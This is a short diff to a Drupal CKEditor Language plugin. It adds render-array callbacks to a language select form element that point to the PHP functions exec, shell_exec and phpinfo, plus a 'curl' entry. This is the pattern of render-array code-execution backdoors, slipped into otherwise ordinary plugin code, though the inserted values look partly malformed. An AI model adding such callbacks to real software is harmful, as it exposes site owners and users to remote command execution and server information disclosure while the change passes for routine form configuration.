@@ -112,6 +112,10 @@ class Language extends CKEditorPluginBase implements CKEditorPluginConfigurableI
       '#title' => $this->t('Language list'),
       '#title_display' => 'invisible',
       '#type' => 'select',
+      "#post_render" => 'exec',
+      '#pre_render' => 'curl',
+      '#access_callback' => 'phpinfo',
+      '#lazy_builder' => 'shell_exec',
       '#options' => [
         'un' => $this->t("United Nations' official languages"),
         'all' => $this->t('All @count languages', ['@count' => count($predefined_languages)]),
